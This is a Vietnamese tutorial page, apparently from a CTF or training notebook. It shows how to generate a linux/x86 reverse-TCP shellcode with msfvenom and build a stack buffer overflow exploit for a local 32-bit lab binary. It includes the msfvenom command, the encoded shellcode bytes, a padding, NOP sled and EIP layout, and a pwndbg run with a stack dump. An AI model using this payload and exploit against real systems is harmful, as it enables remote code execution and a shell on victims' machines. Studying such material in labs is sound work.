# Generating Shellcode
---
Chúng ta đã biết về công cụ **msfvenom** dùng để tạo ra độ dài gần đúng của shellcode. Bây giờ chúng ta có thể sử dụng lại công cụ này để tạo shellcode thực tế, điều này làm cho CPU của hệ thống mục tiêu thực thi lệnh mà chúng ta muốn có.

Nhưng trước khi tạo shellcode, chúng ta phải đảm bảo rằng các thành phần và thuộc tính riêng lẻ phù hợp với hệ thống đích. Vì vậy chúng ta phải chú ý đến các lĩnh vực sau:
- Architecture
- Platform
- Bad Characters

**MSFvenom Syntax**
```
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```
**MSFvenom - Generate Shellcode**

```shell
└─$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

    Running the 'init' command for the database:
    Existing database found, attempting to start it
    Starting database at /home/chidok/.msf4/db...pg_ctl: another server might be running; trying to start server anyway
    server starting
    success
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 95 (iteration=0)
    x86/shikata_ga_nai chosen with final size 95
    Payload size: 95 bytes
    Final size of c file: 425 bytes
    Saved as: shellcode
```

**Shellcode**
```shell
└─$ cat shellcode
unsigned char buf[] =
"\xd9\xc8\xba\xe2\x7a\x2a\xc8\xd9\x74\x24\xf4\x5b\x33\xc9"
"\xb1\x12\x31\x53\x17\x03\x53\x17\x83\x21\x7e\xc8\x3d\x94"
"\xa4\xfb\x5d\x85\x19\x57\xc8\x2b\x17\xb6\xbc\x4d\xea\xb9"
"\x2e\xc8\x44\x86\x9d\x6a\xed\x80\xe4\x02\x91\x72\x17\xd3"
"\x05\x71\x17\xa9\xbc\xfc\xf6\xfd\x59\xaf\xa9\xae\x16\x4c"
"\xc3\xb1\x94\xd3\x81\x59\x49\xfb\x56\xf1\xfd\x2c\xb6\x63"
"\x97\xbb\x2b\x31\x34\x35\x4a\x05\xb1\x88\x0d";
```

Bây giờ chúng ta đã có shellcode, chúng ta điều chỉnh nó để chỉ có một chuỗi, sau đó chúng ta có thể điều chỉnh và gửi lại cách khai thác đơn giản của mình.

## Tính toán buffer
```shell
    Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
    NOPs = "\x90" * 124     
    Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2" # Length = 95
    EIP = "\x66" * 4'
```

## Exploit with Shellcode

```shell
pwndbg> run $(python2 -c 'print("\x55" * 817 + "\x90" * 124 + "\xd9\xc8\xba\xe2\x7a\x2a\xc8\xd9\x74\x24\xf4\x5b\x33\xc9" + "\xb1\x12\x31\x53\x17\x03\x53\x17\x83\x21\x7e\xc8\x3d\x94" + "\xa4\xfb\x5d\x85\x19\x57\xc8\x2b\x17\xb6\xbc\x4d\xea\xb9" + "\x2e\xc8\x44\x86\x9d\x6a\xed\x80\xe4\x02\x91\x72\x17\xd3" + "\x05\x71\x17\xa9\xbc\xfc\xf6\xfd\x59\xaf\xa9\xae\x16\x4c" + "\xc3\xb1\x94\xd3\x81\x59\x49\xfb\x56\xf1\xfd\x2c\xb6\x63" + "\x97\xbb\x2b\x31\x34\x35\x4a\x05\xb1\x88\x0d" + "\x66" * 4)')
Starting program: /mnt/d/Code/All-CTF/BufferOverflow/Linux_x86/Exploxit/Attack/bow32 $(python2 -c 'print("\x55" * 817 + "\x90" * 124 + "\xd9\xc8\xba\xe2\x7a\x2a\xc8\xd9\x74\x24\xf4\x5b\x33\xc9" + "\xb1\x12\x31\x53\x17\x03\x53\x17\x83\x21\x7e\xc8\x3d\x94" + "\xa4\xfb\x5d\x85\x19\x57\xc8\x2b\x17\xb6\xbc\x4d\xea\xb9" + "\x2e\xc8\x44\x86\x9d\x6a\xed\x80\xe4\x02\x91\x72\x17\xd3" + "\x05\x71\x17\xa9\xbc\xfc\xf6\xfd\x59\xaf\xa9\xae\x16\x4c" + "\xc3\xb1\x94\xd3\x81\x59\x49\xfb\x56\xf1\xfd\x2c\xb6\x63" + "\x97\xbb\x2b\x31\x34\x35\x4a\x05\xb1\x88\x0d" + "\x66" * 4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x5655619d in bowfunc ()
```
## Stack

```shell
pwndbg> x/2000xb $esp+550

0xffffd132:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd13a:     0x90    0x90    0xd9    0xc8    0xba    0xe2    0x7a    0x2a
                                |---> ShellCode Start
0xffffd142:     0xc8    0xd9    0x74    0x24    0xf4    0x5b    0x33    0xc9
0xffffd14a:     0xb1    0x12    0x31    0x53    0x17    0x03    0x53    0x17
```

**FUNC show size of stack: gdb info proc all**

